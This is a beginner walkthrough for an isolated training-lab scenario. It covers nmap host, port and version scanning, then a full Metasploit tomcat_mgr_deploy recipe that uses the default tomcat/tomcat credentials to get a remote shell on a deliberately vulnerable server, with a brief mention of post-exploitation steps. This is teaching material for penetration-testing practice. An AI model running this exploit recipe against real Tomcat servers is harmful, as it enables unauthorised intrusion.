## Scenario 1: Network Reconnaissance & Exploitation

> **Network:** Your lab uses `$TARGET_SUBNET` (formula `10.0.<50+pod_id>.0/24`). Kali `$TARGET_KALI`, Meta `$TARGET_META`, DVWA `$TARGET_DVWA`.

A guided, beginner walkthrough. Read each step's _“What you're doing & why”_ box as you go, you'll finish knowing not just the commands, but what each one actually does.

Easy 30–45 min · MITRE T1046 · Attacker (Kali) · 4 milestones

## 0. Before you start: the big picture

This scenario walks you through the first two phases of almost every real attack, in order:

You are the **attacker**, working from a **Kali Linux** machine (a Linux distribution pre-loaded with security tools). Your job is to discover a target machine called **Meta**, learn what it's running, and break into it through a misconfigured web service. Everything happens inside your own **isolated lab environment**, a private mini-network that only you can touch, so nothing you do here leaves the lab.

**What is the lab environment?** When you start Scenario 1, the portal spins up a small private network just for you: your Kali box plus one or two target machines. They can see each other but nothing outside. That's why you can attack freely, these targets are _meant_ to be broken into for training. 

### Your network

Every lab gets its own subnet using the formula `10.0.<50+pod_id>.0/24`. The examples below assume lab slot 1 (`$TARGET_SUBNET`), **use the IPs shown in your own lab header if they differ.**

Host | IP | What it is / how you reach it  
--- | --- | ---  
**Kali (you)** | `$TARGET_KALI` | Your attack box. Open the **Kali Linux (CLI)** tab in the portal, you type commands here.  
**Meta** | `$TARGET_META` | The main target (a deliberately vulnerable Linux server). Runs ports 21, 22, 80, and 8180 (Tomcat).  
**DVWA** | `$TARGET_DVWA` | A second target, only used for the optional stretch scans here.  
  
Shortcut Your Kali shell already has the target IPs saved as environment variables: `$TARGET_META` and `$TARGET_DVWA`. You can type `echo $TARGET_META` to confirm, and use the variable in place of the IP in any command. 

## 1. The two tools you'll use

### Nmap, the network scanner

**Nmap** ("Network Mapper") sends specially crafted packets to other machines and listens for how they reply. From those replies it can tell you: which hosts are alive, which network **ports** are open, and often what software (and version) is listening on each port. Tasks 1–3 are all Nmap, each time asking a more detailed question.

What's a "port"? A single machine runs many services at once (web, SSH, FTP…). A **port** is a numbered door, web servers usually sit on port 80, SSH on 22, FTP on 21. Finding open ports tells you which doors are worth trying. 

### Metasploit, the exploitation framework

**Metasploit** is a toolkit of ready-made exploits. You launch its console (`msfconsole`), pick an exploit **module** , tell it your target and options, and run it. In Task 4 you'll use it to abuse a Tomcat server that still has its **default password** , uploading a payload that hands you a remote shell.

## 2. How scoring works (read this, it's the #1 source of confusion)

The scorer **does not watch your screen**. After each task it reads your **Kali command history** (and, for Task 4, your **Metasploit history**) looking for evidence that you ran the right command. Think of it like a lab notebook: the grader only sees what you _wrote down_ in your history, not what happened live.

Two habits that make scoring reliable **1.** After a command succeeds, press **Enter** once (this flushes it to history), then click **Manual Check** for that task in the portal.  
**2.** Stay in the **Kali** tab. Commands run from the Meta tab or a desktop GUI won't be in the history the scorer reads. 

**Points:** the four milestones total the scenario's score. You clear a milestone when its Manual Check turns to PASS.

---

### Task 1: find what's alive on the subnet

**Goal:** find which machines are alive on your subnet `$TARGET_SUBNET`.

> **What you're doing & why:** Before you can attack anything, you need to know what's _out there_. This is a **ping sweep** : Nmap pings every one of the 254 possible addresses in the subnet and reports which ones answer. No ports are scanned yet, you're just taking attendance. 
```bash
nmap -sn $TARGET_SUBNET
```

Part | What it means  
--- | ---  
`nmap` | run the scanner  
`-sn` | **"ping scan, no port scan"**, just check which hosts are up. (The `s` is for scan type; `n` means "skip the port scan".)  
`$TARGET_SUBNET` | the whole subnet, the `/24` means "scan all 256 addresses from .0 to .255".  
  
**Done when:** you see replies from at least `$TARGET_META` (Meta) and `$TARGET_DVWA` (DVWA), plus your own Kali.

**Then:** Portal → Tasks → **Manual Check** on _Host Discovery_.

What you can do with this You now have a live-host map of your subnet, that's your **scope**. From here you stop scanning the whole `/24` and focus on the box worth attacking: **Meta ($TARGET_META)**. Everything downstream targets that host. 

If something's off Subnet variable empty? Run `echo $TARGET_SUBNET` or read the IP strip in the lab header. No replies at all? Make sure you're in the **Kali** tab, not the Meta tab. 


### Task 2: find the open doors on Meta

**Goal:** list the open TCP ports on Meta (you should find 21, 22, 80, and 8180).

> **What you're doing & why:** Now that you know Meta is alive, you knock on its doors. Each **open port** is a running service you might be able to attack. Port **8180** is the interesting one here, that's Apache Tomcat, your way in later. 

#### Recommended (includes 8180)
```bash
nmap -p 21,22,80,8180 $TARGET_META
```

Optional faster common-port scan (may miss 8180):
```bash
nmap -F $TARGET_META
```

Part | What it means  
--- | ---  
`-p 21,22,80,8180` | scan **these specific ports**, includes Tomcat on **8180**, which this task's Done-when requires  
`-F` | **"fast scan"**, only the 100 most common ports; convenient, but **8180 is not in that set**  
  
Please don't run `-p-` first A full `-p-` scan checks all 65,535 ports and is slow on a shared lab host. Prefer `-p 21,22,80,8180`; only do a full scan if you genuinely need it. 

**Done when:** you can see Meta's open ports, **including 8180**.

**Then:** **Manual Check** on _Port Enumeration_.

What you can do with this Each open port is a running service you might attack. Port **8180 (Tomcat)** is the promising door here. Next you'll fingerprint its exact version to find a matching exploit, and you can ignore the closed ports entirely. 


### Task 3: identify the software & versions

**Goal:** find out _which software and version_ is running on each interesting port.

> **What you're doing & why:** Knowing a port is open isn't enough, you want to know _exactly_ what's listening (e.g. "Apache Tomcat 5.5"). Version strings are gold: they tell you which known exploits might work. Nmap does this by reading the little "banner" each service sends when you connect. 
```bash
nmap -sV -p 21,22,80,8180 $TARGET_META
```

Part | What it means  
--- | ---  
`-sV` | **"service/version detection"**, probe each open port and report the software name and version.  
`-p 21,22,80,8180` | limit the probe to the ports you already found (faster than re-scanning everything).  
  
Scoring detail The checker specifically looks for an `nmap` command containing `-sV` in your history, so make sure `-sV` is in the line you actually run. 

**Done when:** the output shows versions, e.g. OpenSSH on 22, Apache on 80, and **Tomcat on 8180**.

**Then:** **Manual Check** on _Service Version Detection_.

What you can do with this Version strings are gold. Search them in **Exploit-DB** or Metasploit (`search tomcat_mgr`) to find a known exploit for that exact software, this is how recon turns into the working attack you run in Task 4. 


### Task 4: break into Tomcat and get a shell

**Goal:** use Metasploit to break into Meta's Tomcat on port 8180 and land a shell as the `tomcat` user.

> **What you're doing & why:** Apache Tomcat has an admin panel called **Manager** that can install web apps. If it still uses the **default password** (`tomcat`/`tomcat`), anyone can log in and upload their own app, which is really code that runs on the server. Metasploit automates all of this: it logs in, deploys a malicious app, triggers it, and gives you a remote shell. This is why **default credentials** are one of the most common real-world weaknesses. 

#### Step 1, get Meta's IP (Kali shell, before Metasploit)

`msfconsole` does **not** expand shell variables. If you type the characters `$TARGET_META` inside Metasploit, the exploit will not reach Meta and you will get **no session**.

In the **Kali** shell (not yet in msf), run:

```bash
echo $TARGET_META
```

Remember that IP (same as **Meta** in the lab header; in lab slot 1 it's usually `10.0.51.20`). You will paste **those digits** into `set RHOSTS` below. When this Guide is loaded in the portal, the Copy button on the next block should already show your real Meta IP in place of `$TARGET_META`, use that.

#### Step 2, launch Metasploit
```bash
msfconsole -q
```

#### Step 3, configure and run (inside msfconsole)

> **Required, or you get *Exploit completed, but no session was created*:**  
> 1. `set RHOSTS` must be the **numeric Meta IP** (not the literal text `$TARGET_META`)  
> 2. `set PATH /manager/text`  
> 3. `set TARGET 1` (must be set **before** `run`)

Copy/paste **one line at a time**:

```bash
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS $TARGET_META
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set PATH /manager/text
set TARGET 1
run
```

Verified working shape (lab slot 1 example, use **your** Meta IP):

```bash
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS 10.0.51.20
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set PATH /manager/text
set TARGET 1
run
```

Command | What it does  
--- | ---  
`use …` | select the Tomcat Manager deploy exploit  
`set RHOSTS` | Meta's **numeric** IP (from Step 1 / lab header)  
`set RPORT 8180` | Tomcat port  
`set HttpUsername / HttpPassword` | defaults `tomcat` / `tomcat`  
`set PATH /manager/text` | **required** Manager API path on this Debian Tomcat  
`set TARGET 1` | **required** payload target, without this, Metasploit often finishes with **no session**  
`run` | fire the exploit  

#### Step 4, confirm you're in (inside the new session)
```bash
id
whoami
```

Success looks like:

```text
uid=1001(tomcat) gid=1001(tomcat) groups=1001(tomcat)
```

(The numeric uid may differ; the name in parentheses must be `tomcat`.)

#### Step 5, exit the session (required for scoring)
```bash
exit
```

> **Why exit matters:** Manual Check reads your **Metasploit history**. That history is not fully written until the session/console activity is flushed, so this milestone can stay FAIL until you actually run `exit`. If it still fails after a working shell, run one more msf command or close `msfconsole` cleanly, then re-check.

**Done when:** you got a `tomcat` shell (e.g. `uid=1001(tomcat) …`), your msf history includes numeric `set RHOSTS …`, `set PATH /manager/text`, and `set TARGET 1`, and you ran `exit`.

**Then:** **Manual Check** on _Tomcat Manager Exploitation_.

> **What you can do with this:** You have a shell as the `tomcat` service account. From this foothold you'd enumerate the host, hunt for a **privilege-escalation** path to root, harvest credentials and config files, and pivot to other machines on the lab network. This shell is the launch point for the rest of an engagement. 

---
## 3. Recon playground (explore, not scored)

Once your four milestones are green, try these to go deeper and actually understand what recon can reveal. They're safe here, it's your isolated lab. Run them from the **Kali** tab against Meta (`$TARGET_META`) or DVWA (`$TARGET_DVWA`).

Command | What it teaches / what you'll see  
--- | ---  
`sudo nmap -O $TARGET_META` | Guesses the target's **operating system** from subtle quirks in how it replies.  
`nmap -sV -sC $TARGET_META` | Service versions **plus** default NSE scripts, banners, page titles, and extra clues.  
`nmap --script vuln $TARGET_META` | Runs vulnerability-detection scripts that flag known CVEs on the open services.  
`nmap -p- $TARGET_META` | Scans all 65,535 ports (slow). Be courteous on a shared host, use only when you truly need it.  
`nmap -sU --top-ports 20 $TARGET_META` | Checks common **UDP** services (DNS, SNMP…) that TCP scans never see.  
`whatweb http://$TARGET_DVWA` · `curl -I http://$TARGET_DVWA` | Identifies the web server/tech and shows response headers without opening a browser.  
In msfconsole after your shell: `sysinfo` · `getuid` · `shell` | Confirms who and where you are on Meta, and drops you into a full system shell.  
  
These are noisy OS, version, and `--script vuln` scans light up a defender's sensors. Analysing exactly that noise is **Scenario 3 (SIEM Alert Triage)**. None of this is required to finish this room. 

## 4. Common failures & fixes

Symptom | Fix  
--- | ---  
Manual Check FAIL after nmap | Press **Enter** , wait ~1s, check again. Make sure you're in the Kali tab.  
No route / host down | Confirm the lab is **ACTIVE** ; use the exact IPs from your lab header.  
`Exploit completed, but no session was created` | Almost always missing **`set TARGET 1`** before `run`, or `set RHOSTS` was the literal text `$TARGET_META` instead of digits. Fix both, `run` again.  
Tomcat exploit fails / no shell | History must show **`set PATH /manager/text`**, **`set TARGET 1`**, `RPORT 8180`, creds `tomcat`/`tomcat`, and a numeric Meta IP on `RHOSTS`.  
Wrong tab | Tasks 1–4 all run from **Kali** , never the Meta tab.  
Guide still shows `msf6 >` / `search tomcat` / no `TARGET 1` | Hard-refresh the Guide panel; on the host confirm `grep TARGET ~/cyberrange/portal/public/scenarios/scenario_01_network_reconnaissance.md` includes `set TARGET 1`.  
